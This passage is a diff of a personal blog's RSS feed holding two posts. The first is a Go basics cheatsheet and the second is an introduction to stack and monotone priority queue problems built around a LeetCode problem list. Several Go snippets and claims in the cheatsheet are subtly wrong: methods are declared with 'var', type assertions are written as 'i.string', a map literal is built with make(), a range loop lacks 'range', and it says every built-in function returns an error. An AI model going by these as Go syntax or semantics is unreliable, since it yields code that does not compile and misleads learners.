+  &lt;li&gt;Go though these three articles. &lt;a href=&quot;https://golang.org/doc/install&quot;&gt;Getting Started&lt;/a&gt;, &lt;a href=&quot;https://tour.golang.org/welcome/1&quot;&gt;A Tour of Go&lt;/a&gt;, &lt;a href=&quot;https://golang.org/doc/code.html&quot;&gt;How to Write Go Code&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;cheatsheet&quot;&gt;Cheatsheet&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;0.Entry point&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Go program starts from package main.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1.Export&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Capitalized function is exported. Non-capitalized function isn’t exported.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2.Variable type is at end of declaration.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var a int = 3
+a int := 3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;3.Basic types.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;bool, string
+int  int8  int16  int32  int64
+uint uint8 uint16 uint32 uint64 uintptr
+byte // alias for uint8
+rune // alias for int32, represents a Unicode code point
+float32 float64
+complex64 complex128
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;4.Output type of a variable.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;printf(&quot;%T&quot;, variable)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;5.Type conversion/casting.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;new_type(variable)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;6.const&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;const name = value
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;7.Group of definition or import.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var/const (
+  x = 1
+  y = 2
+)
+import (
+  &quot;package 1&quot;
+  &quot;package 2&quot;
+)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;8.Function with multiple return value.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;func name(x int, y int) (int, int) {
+  return 1, 2
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;9.Switch 1&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Switch use &lt;code&gt;fallthrough&lt;/code&gt; as key word to let two consecutive cases run sequentially. In Go, we don’t use &lt;code&gt;break&lt;/code&gt; key word to terminate switch cases, they stop automatically.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;10.Switch 2&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Value of switch case could be any type, even function value is okay. Using switch without a condition is okay, then the switch case takes some boolean value, this is useful for concise if-else combination.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;11.Defer&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The deferred call’s arguments are evaluated immediately, but the function call is not executed until the surrounding function returns. When there are multiple defer functions, they are stacked in a FILO pattern.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;12.Pointer&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Pointer is like c-style, but do not support pointer arithmetic.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;13.Struct&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;type Name struct {
+  x int
+  y int
+}
+name := Name{x:1, y:2}
+name.x
+p = &amp;amp;name
+p.x is okay!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;14.Array&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var name [10]int
+name := [3]int{1,2,3}
+name := […]int{1,2,3} //same effect as previous statement
+len(name)
+cap(name) //capacity
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;15.Slice&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Slice is similar to array, but more flexible! Array is fixed sized, while size of slice could be modified. It is built on top of array, which is very similar to list in Java.&lt;/p&gt;
+
+&lt;p&gt;Internal of slice is a pointer to a position in an array, the length, the capacity.&lt;/p&gt;
+
+&lt;p&gt;Slice could be create by make&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;name := make([]int, length)
+name := make([]int, length, capacity)
+name := make([]int, 0, 5) //an array with capacity 5 and length 0, initialized all value 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;or by slicing an array or slice&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;name[1:3] //have value at position 1,2. name could be an array or slice
+name[1:]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When creating slice by slicing, the data is not copied! just modify the pointer&lt;/p&gt;
+
+&lt;p&gt;And notice, when slicing, the length is determined by slice range, but the capacity is determined by maximum range which is from slice range begin to end of underlying array.&lt;/p&gt;
+
+&lt;p&gt;Notice, this may cause problem because we may only need part of the array, but we are keeping the whole array in memory. So sometimes it would be better to copy that part, or other method such as append part of array to a &lt;code&gt;nil&lt;/code&gt; array, to let garbage collector reclaim those memory.&lt;/p&gt;
+
+&lt;p&gt;https://blog.golang.org/go-slices-usage-and-internals&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;16.Slice is initialized as nil&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var name []int
+name == nil //true
+len(name) //0
+cap(name) //0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;17.Slice copy/append&lt;/strong&gt;&lt;br /&gt;
+Slice could be copied between different lengthy,  or even underlying overlapped slices.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;copy(destination, source)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;this will copy elements of smaller number in &lt;code&gt;source&lt;/code&gt; and &lt;code&gt;destination&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var name = []int{1,2,3}
+append(name, 1, 2, 3)
+
+var name2= []int{4,5,6}
+append(name, name2…) //could append another slice. notice the … would unwrap the second slice
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;18.Array/slice range&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;A convenient way to iterate element in array and slice.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;for index, value := range arrayName {
+  //notice value is a copy of the element
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Could skip the value, then&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;for index := range arrayName {}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or could skip index, then&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;for _, v := range array {}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;19.Map&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Map must be created using make.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var name = make(map[key_type] value_type)
+var map = make(map[string] int)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or could be initialized like JSON.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var map = make(map[string] int) {
+  &quot;key1&quot;:10,
+  &quot;key2&quot;:20, //notice the commas is necessary!
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Map operation is usual.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;map[key] = value
+value, ok = map[key] //ok is true if key exist
+delete(map, key)
+
+for key, value := map {
+  //iterate map
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;20.Function as first class&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Could pass function as a parameter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;func name(fn func(x, y int) int) int {}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Notice all function argument is value copy. Not reference.&lt;/p&gt;
+
+&lt;p&gt;Also, function has closure.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;21.Class&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Go doesn’t have built-in class. But we could use function to help variable to act like a class.&lt;/p&gt;
+
+&lt;p&gt;We should assign a &lt;em&gt;receiver&lt;/em&gt; type to a function, then any variable of this receiver type could call this function. So it looks like the receiver type is a class, variable is an object, and the function is a member function.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var (f MyFloat) Abs() float64 {}//MyFloat is receiver type
+var Abs(f MyFloat) float64{} //function-wise same
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But receiver could only be type defined in the same package. So could not set receiver as built-in type, including &lt;code&gt;int&lt;/code&gt;, &lt;code&gt;float&lt;/code&gt; etc.&lt;/p&gt;
+
+&lt;p&gt;Receiver could be pointer. This does not require the variable calling this function to be a pointer. It means the value of receiver is not copied to the function, instead a reference is given so that the function could modify the value of receiver. Though use a pointer as receiver variable to call function is recommended!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var (f *MyFloat) Abs() {} //now Abs could directly modify f in its body
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All methods on a given type should have either value or pointer receivers, but not a mixture of both. (This is a design matter)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;22.Interface&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;type name interface {
+  functionName(argument) return_type
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;name x&lt;/code&gt; could be any type that support the function.&lt;/p&gt;
+
+&lt;p&gt;Empty interface acts like &lt;code&gt;void*&lt;/code&gt; in C language.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var i interface{} //empty interface, i is nil after created
+i = “aa&quot;
+i = 43 //both are correct
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Because the interface could be assigned to any concrete variable, sometimes we want to know what’s underlying concrete type.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var i interface{} = &quot;hello&quot;
+s := i.string //s will be “hello&quot;
+f := i.float64 //run time error
+f, ok := i.float64 //no error, ok would be false
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;23.Switch 3&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Switch could be used to switch types.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;switch v:= i.(type) {
+case T:
+case S:
+default:
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;24.Stringer interface&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;A built-in interface, similar to &lt;code&gt;toString()&lt;/code&gt; in Java.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;type Stringer interface {
+  String() string
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;25.Error&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Every built-in function return an error as last parameter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;return_value, err = function_name()
+if err == nil {} else {}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;26.IO Reader&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Reader is an input stream.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;import {
+  &quot;io&quot;
+  &quot;strings&quot;
+}
+r := strings.NewReader(&quot;Hello, Reader!&quot;)
+b := make([]byte, 8)
+n, err := r.Read(b)
+if err == io.EOF {
+  break
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;27. Routine&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Routine is like thread in other languages. You run a function in another thread.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;go fun_name(parameters)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This starts a new goroutine/ light-weight thread. The parameters are evaluated when executing this line, i.e. current goroutine, but execution of the function is happen in the new goroutine, i.e. in the future.&lt;/p&gt;
+
+&lt;p&gt;These go routines run in same address space, so that access to shared memory need synchronized.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;28.Rendezvous channel&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Rendezvous means synchronized. A rendezvous channel is a channel without defining size, so that the sender and receiver would be synchronized all the time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var channel = make(chan int)
+channel &amp;lt;- v  //offer v into channel, block until v is taken from receiver
+v := &amp;lt;- channel //take v from channel, block until sender offer a value into channel
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;29.Buffered channel&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Buffered channel is channel with a defined capacity. So the sender and receiver could act like producer consumer model, where the channel acts like a queue with fixed size.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;var channel = make(chan int, capacity)
+channel &amp;lt;- v //sender be blocked when channel full
+v := &amp;lt;- channel //receiver blocked when channel empty
+cap(channel) //capacity
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;30.Channel close and check&lt;/strong&gt;&lt;br /&gt;
+Sender &lt;em&gt;could&lt;/em&gt;  and only sender &lt;em&gt;should&lt;/em&gt; close channel&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;close(channel)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Receiver could check whether channel is closed by&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;v, ok := &amp;lt;- channel
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A channel could be iterated using range.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;for i:= range(channel) {
+  //i is element in channel
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;when channel is closed, this iteration will stop.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;31.Select&lt;/strong&gt;&lt;br /&gt;
+Select a random executable statement to run. Notice each case statement should interact with a channel.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;select {
+  case c &amp;lt;- x://executable when channel is not full
+  case &amp;lt;- c: //executable when channel is not empty
+  default ://executable when channel is neither full nor empty
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;32.sync.Mutex&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Go provide built-in mutex acting as lock. Though it suggests design pattern to do concurrency without locks.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;mux sync.Mutex
+mux.Lock()
+//do something
+mux.Unlock()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;33.Share memory by communicating&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Don’t communicate by sharing memory; share memory by communicating.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://golang.org/doc/codewalk/sharemem/&quot;&gt;Go blog: shareemem codewalk&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;A naive interpretation: Do not use lock and shared memory, as a method to communicate among threads. Instead, use channel as communication tool, and share data among threads without lock.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;34.Go syntax&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A good post talking about why’s the similarity and difference between Go syntax and C syntax.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.golang.org/gos-declaration-syntax&quot;&gt;Go blog: Go’s declaration syntax&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;35.Defer, panic, recover&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A defer statement pushes a function call onto a list. The list of saved calls is executed after the surrounding function returns. Defer is commonly used to simplify functions that perform various clean-up actions.&lt;/p&gt;
+
+  &lt;ol&gt;
+    &lt;li&gt;
+      &lt;p&gt;A deferred function’s arguments are evaluated when the defer statement is evaluated.&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li&gt;
+      &lt;p&gt;Deferred function calls are executed in Last In First Out order after the surrounding function returns.&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li&gt;
+      &lt;p&gt;Deferred functions may read and assign to the returning function’s named return values.&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+
+  &lt;p&gt;This is convenient for modifying the error return value of a function&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;Panic is a built-in function that stops the ordinary flow of control and begins panicking. When the function F calls panic, execution of F stops, any deferred functions in F are executed normally, and then F returns to its caller. To the caller, F then behaves like a call to panic. The process continues up the stack until all functions in the current goroutine have returned, at which point the program crashes. Panics can be initiated by invoking panic directly. They can also be caused by runtime errors, such as out-of-bounds array accesses.&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;Recover is a built-in function that regains control of a panicking goroutine. Recover is only useful inside deferred functions. During normal execution, a call to recover will return nil and have no other effect. If the current goroutine is panicking, a call to recover will capture the value given to panic and resume normal execution.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.golang.org/defer-panic-and-recover&quot;&gt;Go blog: defer panic and recover&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;36.Test&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Go provides a built-in test platform.&lt;/p&gt;
+
+&lt;p&gt;The convention is:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Within the package, have a go file named XXX__test.go&lt;/li&gt;
+  &lt;li&gt;Within this go file, have functions named TestXXX.go&lt;/li&gt;
+  &lt;li&gt;The test function should have format as&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;code&gt;go
+  func TestXXX(t *testing.T) {}
+ &lt;/code&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Import package &lt;code&gt;&quot;testing&quot;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Use &lt;a href=&quot;https://golang.org/pkg/testing/&quot;&gt;test functions&lt;/a&gt; to indicate error. This including&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;t.Error
+t.Errorf
+t.Fail
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Wed, 23 Mar 2016 16:09:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/03/23/cheatsheet-go-basics/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/03/23/cheatsheet-go-basics/</guid>
+        
+        <category>Go</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cracking Code Challenge The Hard Way - Stack, Queue, Priority Queue and advanced applications (1) -- Stack and Monotone Priority Queue</title>
+        <description>&lt;h1 id=&quot;cracking-code-challenge-the-hard-way---stack-queue-priority-queue-and-advanced-applications-1----stack-and-monotone-priority-queue&quot;&gt;Cracking Code Challenge The Hard Way - Stack, Queue, Priority Queue and advanced applications (1) – Stack and Monotone Priority Queue&lt;/h1&gt;
+
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+
+&lt;p&gt;Awww yah!&lt;/p&gt;
+
+&lt;p&gt;In these short series, I will cover basic data structures including Stack, Queue, and Priority Queue, and there mutations or advanced applications, including Priority Queue with log time complexity deletion, Monotone Priority Queue and Deque.&lt;/p&gt;
+
+&lt;p&gt;This article will cover Stack and Monotone Priority Queue.&lt;/p&gt;
+
+&lt;p&gt;These problems will be included in this article:&lt;/p&gt;
+
+&lt;p&gt;Stack&lt;/p&gt;
+
+&lt;p&gt;1.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-preorder-traversal/&quot;&gt;Binary Tree Preorder Traversal&lt;/a&gt;&lt;br /&gt;
+ 2.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-inorder-traversal/&quot;&gt;Binary Tree Inorder Traversal&lt;/a&gt;&lt;br /&gt;
+ 3.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-postorder-traversal/&quot;&gt;Binary Tree Postorder Traversal&lt;/a&gt;&lt;br /&gt;
+ 4.&lt;a href=&quot;https://leetcode.com/problems/verify-preorder-sequence-in-binary-search-tree/&quot;&gt;Verify Preorder Sequence in Binary Search Tree&lt;/a&gt;&lt;br /&gt;
+ 5.&lt;a href=&quot;https://leetcode.com/problems/verify-preorder-serialization-of-a-binary-tree/&quot;&gt;Verify Preorder Serialization of a Binary Tree&lt;/a&gt;&lt;br /&gt;
+ 6.&lt;a href=&quot;https://leetcode.com/problems/evaluate-reverse-polish-notation/&quot;&gt;Evaluate Reverse Polish Notation&lt;/a&gt;&lt;br /&gt;
+ 7.&lt;a href=&quot;https://leetcode.com/problems/basic-calculator/&quot;&gt;Basic Calculator&lt;/a&gt;&lt;br /&gt;
+ 8.&lt;a href=&quot;https://leetcode.com/problems/basic-calculator-ii/&quot;&gt;Basic Calculator II&lt;/a&gt;&lt;br /&gt;
+  9.&lt;a href=&quot;https://leetcode.com/problems/valid-parentheses/&quot;&gt;Valid Parentheses&lt;/a&gt;&lt;br /&gt;
+  10.&lt;a href=&quot;https://leetcode.com/problems/longest-valid-parentheses/&quot;&gt;Longest Valid Parentheses&lt;/a&gt;&lt;br /&gt;
+  11.&lt;a href=&quot;https://leetcode.com/problems/remove-invalid-parentheses/&quot;&gt;Remove Invalid Parentheses&lt;/a&gt;&lt;br /&gt;
+   12.&lt;a href=&quot;https://leetcode.com/problems/largest-rectangle-in-histogram/&quot;&gt;Largest Rectangle in Histogram&lt;/a&gt;&lt;br /&gt;
+ 13.&lt;a href=&quot;http://www.lintcode.com/en/problem/max-tree/#&quot;&gt;Max Tree&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;stack&quot;&gt;Stack&lt;/h2&gt;
+
+&lt;h3 id=&quot;key-idea&quot;&gt;Key Idea&lt;/h3&gt;
+
+&lt;p&gt;Stack is helpful when the problem could be solved in a format that every new incoming data/element, referencing formerly saved data/elements &lt;strong&gt;sequentially and backwardly&lt;/strong&gt;, could produce something that is either useful for the next round iteration/recursion, or part of the answer.&lt;/p&gt;
+
+&lt;p&gt;In other words, Stack is used when:&lt;/p&gt;
+
+&lt;p&gt;Result is computed when data is coming sequentially. Also, if a part of result given by incoming data is dependent on formerly saved data, these formerly saved data could only be used sequentially, in a reverse order when they are pushed into the stack.&lt;/p&gt;
+
+&lt;p&gt;No worry if you don’t fully understand this sentence know. Keep it in mind and let’s crack some coding problem!&lt;/p&gt;
+
+&lt;h3 id=&quot;complexity-analysis&quot;&gt;Complexity Analysis&lt;/h3&gt;
+
+&lt;p&gt;Generally speaking, an algorithm designed using stack has $O(N)$ time and space complexity.&lt;/p&gt;
+
+&lt;p&gt;The three most frequently used operation on stack – push, pop and peek use $O(1)$/constant extra space and $O(1)$/constant time. More specifically, the push operation uses amortized $O(1)$ time if stack is implemented using array, since we have to extend array from time to time.&lt;/p&gt;
+
+&lt;h3 id=&quot;tree-traversal-basic-level&quot;&gt;Tree traversal (basic level)&lt;/h3&gt;
+
+&lt;p&gt;Lots of problems related to tree traversal operation could be optimized using stack. By “optimized” I mean you could solve these problems without manage the stack yourselves, i.e. using system stack.&lt;/p&gt;
+
+&lt;p&gt;But manage stack by yourselves has at least two advantages.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Self-managed stack is created in heap space, so that we are far less worried about if there is enough space. This is because stack is generally way smaller than heap (all system/process structure level).&lt;/li&gt;
+  &lt;li&gt;When popping multiple elements from stack, it is more straightforward to do this in a while/for loop, instead of recursively going back.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Solve these problems in both recursive(stack managed by operation system) and iterative(stack managed by programmer) ways. Feel the simplicity of recursion method and manage basic skills using stack.&lt;/p&gt;
+
+&lt;p&gt;1.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-preorder-traversal/&quot;&gt;Binary Tree Preorder Traversal&lt;/a&gt;&lt;br /&gt;
+ 2.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-inorder-traversal/&quot;&gt;Binary Tree Inorder Traversal&lt;/a&gt;&lt;br /&gt;
+ 3.&lt;a href=&quot;https://leetcode.com/problems/binary-tree-postorder-traversal/&quot;&gt;Binary Tree Postorder Traversal&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Be more familiar with stack and order in tree.&lt;/p&gt;
+
+&lt;p&gt;4.&lt;a href=&quot;https://leetcode.com/problems/verify-preorder-sequence-in-binary-search-tree/&quot;&gt;Verify Preorder Sequence in Binary Search Tree&lt;/a&gt;&lt;br /&gt;
+ 5.&lt;a href=&quot;https://leetcode.com/problems/verify-preorder-serialization-of-a-binary-tree/&quot;&gt;Verify Preorder Serialization of a Binary Tree&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;indirect-tree-traversal-medium-level&quot;&gt;Indirect tree traversal (medium level)&lt;/h3&gt;
+
+&lt;p&gt;Calculation tree problem is a good practice and application on top of tree traversal operation. They give you an insight of how a string-like expression could be conceptually translated to a tree, and solved using tree traversal.&lt;/p&gt;
+
+&lt;p&gt;Jump to the second and third problem if you want to challenge yourself, otherwise check the first problem and &lt;a href=&quot;https://en.wikipedia.org/wiki/Reverse_Polish_notation&quot;&gt;Reverse Polish notation&lt;/a&gt; first.&lt;/p&gt;
+
+&lt;p&gt;1.&lt;a href=&quot;https://leetcode.com/problems/evaluate-reverse-polish-notation/&quot;&gt;Evaluate Reverse Polish Notation&lt;/a&gt;&lt;br /&gt;
+ 2.&lt;a href=&quot;https://leetcode.com/problems/basic-calculator/&quot;&gt;Basic Calculator&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;After solving the calculation tree problems, you should have idea to solve parenthesis problems. They partly share the same idea.&lt;/p&gt;
+
+&lt;p&gt;4.&lt;a href=&quot;https://leetcode.com/problems/valid-parentheses/&quot;&gt;Valid Parentheses&lt;/a&gt;&lt;br /&gt;
+  5.&lt;a href=&quot;https://leetcode.com/problems/longest-valid-parentheses/&quot;&gt;Longest Valid Parentheses&lt;/a&gt;&lt;br /&gt;
+  6.&lt;a href=&quot;https://leetcode.com/problems/remove-invalid-parentheses/&quot;&gt;Remove Invalid Parentheses&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;stack-as-monotone-priority-queue-advanced-level&quot;&gt;Stack as Monotone Priority Queue (advanced level)&lt;/h3&gt;
+
+&lt;p&gt;Even though I put these problems in advanced level category, you may find them easy once you get the idea.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[Hint (don’t read the following part unless you get stuck):]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The key idea for these two problems are the same: each new incoming data could help to calculate the final answer, combined with formerly saved data, but only part of them! Which part? Either the data that is larger than itself, or is smaller than itself.&lt;/p&gt;
+
+&lt;p&gt;In this way, we could maintain the stack in a way that all data belong to this stack is monotonically increasing or decreasing. This idea is also called Monotone Priority Queue.&lt;/p&gt;
+
+&lt;p&gt;For more detailed hints and thoughts, see my answer to these problems.&lt;/p&gt;
+
+&lt;p&gt;1.&lt;a href=&quot;https://leetcode.com/problems/largest-rectangle-in-histogram/&quot;&gt;Largest Rectangle in Histogram&lt;/a&gt;&lt;br /&gt;
+ 2.&lt;a href=&quot;http://www.lintcode.com/en/problem/max-tree/#&quot;&gt;Max Tree&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 14 Mar 2016 20:18:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/03/14/Cracking-Code-Challenge-The-Hard-Way-Stack-Queue-Priority-Queue-and-advanced-applications-1-Stack-and-Monotone-Priority-Queue/</link>
